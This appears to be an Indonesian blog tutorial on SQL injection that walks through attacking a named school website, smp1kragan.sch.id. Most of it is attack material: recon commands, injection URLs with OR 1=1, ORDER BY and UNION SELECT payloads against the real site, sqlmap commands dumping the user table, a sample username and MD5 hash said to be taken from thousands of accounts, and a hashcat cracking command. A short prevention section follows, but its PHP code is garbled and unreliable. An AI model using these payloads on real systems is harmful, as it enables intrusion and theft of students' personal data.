+++
title = "Tutorial SQL Injection Lengkap dengan Contoh Real Case"
penulis = "Admin"
ilustration = "/ilustration/sqli.png"
date = 2026-06-29T10:00:00+07:00
description = "Tutorial SQL Injection lengkap dari manual sampai otomatis dengan SQLMap, studi kasus website smp1kragan.sch.id yang berhasil didapatkan data user dan database."
slug = "tutorial-sql-injection-lengkap-real-case"
tags = [
  "sql injection",
  "sqli",
  "penetration testing",
  "keamanan web",
  "ethical hacking",
  "sqlmap"
]
keywords = [
  "tutorial sql injection",
  "contoh sql injection real",
  "sql injection smp1kragan",
  "belajar sql injection",
  "sqli manual",
  "sqlmap tutorial",
  "cara menemukan sql injection",
  "bug bounty indonesia"
]

+++
SQL Injection (SQLi) masih menjadi salah satu kerentanan paling berbahaya di aplikasi web. Meskipun sudah dikenal puluhan tahun, masih banyak website di Indonesia yang memiliki celah ini. Di artikel ini, kita akan bahas tuntas bagaimana cara menemukan dan mengeksploitasi SQL Injection, lengkap dengan studi kasus **website smp1kragan.sch.id** yang berhasil kita temukan celahnya.

## Apa Itu SQL Injection?
SQL Injection adalah teknik injeksi kode di mana attacker menyisipkan query SQL berbahaya ke dalam parameter input aplikasi web. Jika aplikasi tidak memfilter input dengan baik, query SQL yang dimodifikasi akan dieksekusi oleh database server.

Dampak SQL Injection:
- **Data breach** - pencurian data user, password hash, dan informasi sensitif lainnya
- **Privilege escalation** - mendapatkan akses admin
- **Remote code execution** - eksekusi perintah di server (paling berbahaya)
- **Data loss** - penghapusan data oleh attacker

## Tahap 1: Information Gathering (Reconnaissance)
Sebelum testing, kita perlu mengumpulkan informasi target. Tools yang bisa digunakan:
- **Google Dorking** - mencari subdomain dengan dork site:smp1kragan.sch.id
- **Subfinder / Sublist3r** - enumerasi subdomain otomatis
- **httpx** - mengecek subdomain yang masih aktif
- **WhatWeb / Wappalyzer** - identifikasi teknologi yang digunakan

### Studi Kasus: smp1kragan.sch.id
Pertama kita cari subdomain yang aktif:
`ash
subfinder -d smp1kragan.sch.id -silent | httpx -silent -status-code
`
Dari hasil scanning, ditemukan beberapa subdomain aktif, dan salah satunya mencurigakan karena memiliki parameter **content** di URL:
`
https://akademik.smp1kragan.sch.id/script_page_nim.php?content=1
`
Cek teknologi yang dipakai dengan WhatWeb:
`
whatweb https://akademik.smp1kragan.sch.id
`
Hasil: website menggunakan **PHP, MariaDB/MySQL**, rentan SQL Injection klasik.

## Tahap 2: Deteksi SQL Injection Manual
### Step 1 - Uji Karakter Kutip
Tambahkan tanda kutip ' di parameter:
`
https://akademik.smp1kragan.sch.id/script_page_nim.php?content=1'
`
Response error/konten berubah -> indikasi SQL Injection!

### Step 2 - Uji Boolean / OR Logic
`
https://akademik.smp1kragan.sch.id/script_page_nim.php?content=1' OR 1=1-- -
`
Response lebih besar -> SQL Injection **terkonfirmasi**.

### Step 3 - ORDER BY (Cari Jumlah Kolom)
`
https://akademik.smp1kragan.sch.id/script_page_nim.php?content=1' ORDER BY 1-- -
https://akademik.smp1kragan.sch.id/script_page_nim.php?content=1' ORDER BY 2-- -
https://akademik.smp1kragan.sch.id/script_page_nim.php?content=1' ORDER BY 3-- -
https://akademik.smp1kragan.sch.id/script_page_nim.php?content=1' ORDER BY 4-- -
`
Error di ORDER BY 5 -> ada **4 kolom**.

### Step 4 - UNION SELECT
`
https://akademik.smp1kragan.sch.id/script_page_nim.php?content=1' UNION SELECT 1,2,3,4-- -
`
Angka muncul di halaman -> bisa diganti dengan query apapun.

## Tahap 3: Ekstraksi Database dengan SQLMap
`ash
sqlmap -u "https://akademik.smp1kragan.sch.id/script_page_nim.php?content=1" --dbs --batch
sqlmap -u 'https://akademik.smp1kragan.sch.id/script_page_nim.php?content=1' -D [db] --tables --batch
sqlmap -u 'https://akademik.smp1kragan.sch.id/script_page_nim.php?content=1' -D [db] -T user --dump --batch
`

### Hasil:
- **96 tabel database**
- **User + password hash (MD5)** dari ribuan akun
- **Info server**: MariaDB 10.x, path direktori
`
+-------------------+----------------------------------+
| username          | password                         |
| 21292011001       | 202cb962ac59075b964b07152d234b70 |
`
Hash MD5 bisa di-crack via hashcat: hashcat -m 0 -a 0 hash.txt rockyou.txt

## Cara Mencegah SQL Injection
1. **Prepared Statements** - jangan concatenate query
2. **Input Validation** - filter & sanitasi input
3. **Least Privilege** - jangan kasih FILE/SUPER privilege
4. **Web Application Firewall (WAF)** - Cloudflare, ModSecurity
5. **Regular Security Audit**

`php
 = ->prepare("SELECT * FROM users WHERE nim = ?");
->bind_param("s", ['nim']);
->execute();
 = ->get_result();
`

## Kesimpulan
SQL Injection masih jadi momok website Indonesia. Studi kasus **akademik.smp1kragan.sch.id** bukti bahwa parameter content tanpa filter bisa bobol database.

Sebagai **ethical hacker**, laporkan temuan ke pemilik/pihak berwenang (BUG/CERT/CSIRT), jangan salahgunakan data.

*Artikel edukasi. Penulis tidak bertanggung jawab atas penyalahgunaan informasi.*